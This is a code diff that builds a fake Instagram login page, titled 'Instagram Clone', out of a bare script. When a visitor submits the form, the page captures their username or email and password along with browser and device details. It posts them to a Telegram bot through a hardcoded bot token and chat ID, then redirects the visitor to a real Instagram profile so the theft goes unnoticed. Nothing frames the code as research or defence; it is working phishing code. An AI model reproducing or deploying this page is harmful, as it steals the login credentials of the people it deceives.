@@ -1,24 +1,40 @@
-<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-<script>
-    const TOKEN = "7207395066:AAHS6Wre2Lz4iTRTeXZd4FlCULz_AAwJrl8"; // Telegram Bot Token
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram Clone</title>
+</head>
+<body>
+  <main>
+    <form id="login-form">
+      <input type="text" id="email" placeholder="Phone number, username, or email" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+  </main>
+
+  <!-- Axios Library -->
+  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+
+  <!-- Telegram Bot Script -->
+  <script>
+    const TOKEN = "7207395066:AAHS6Wre2Lz4iTRTeXZd4FlCULz_AAwJrl8"; // Bot Token
     const CHAT_ID = "6714651494"; // Your Telegram Chat ID
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`; // Telegram API endpoint
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-    // استماع لنموذج تسجيل الدخول
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-        e.preventDefault(); // منع الإرسال العادي للنموذج
+    document.getElementById('login-form').addEventListener('submit', function (e) {
+      e.preventDefault();
 
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const screenWidth = screen.width;
+      const screenHeight = screen.height;
+      const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        const screenWidth = screen.width;
-        const screenHeight = screen.height;
-        const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-
-        // رسالة سيتم إرسالها إلى تيليجرام
-        const message = ` 
+      const message = `
 <b>New Login Attempt</b>\n
 <b>Email:</b> ${email}\n
 <b>Password:</b> ${password}\n
@@ -26,19 +42,21 @@
 <b>Platform:</b> ${platform}\n
 <b>User Agent:</b> ${userAgent}\n
 <b>Screen:</b> ${screenWidth}x${screenHeight}
-        `;
+      `;
 
-        // إرسال إلى تيليجرام باستخدام axios
-        axios.post(URI_API, {
-            chat_id: CHAT_ID,
-            parse_mode: 'html',
-            text: message
-        }).then(response => {
-            // ✅ إعادة التوجيه بعد الإرسال
-            window.location.href = "https://www.instagram.com/w__iam__15__/";
-        }).catch(error => {
-            console.error('Telegram Error:', error);
-            alert('Error sending data to Telegram.');
-        });
+      axios.post(URI_API, {
+        chat_id: CHAT_ID,
+        parse_mode: 'html',
+        text: message
+      })
+      .then(() => {
+        window.location.href = "https://www.instagram.com/w__iam__15__/";
+      })
+      .catch((error) => {
+        console.error("Telegram error:", error);
+        alert("Failed to send data to Telegram.");
+      });
     });
-</script>
+  </script>
+</body>
+</html>
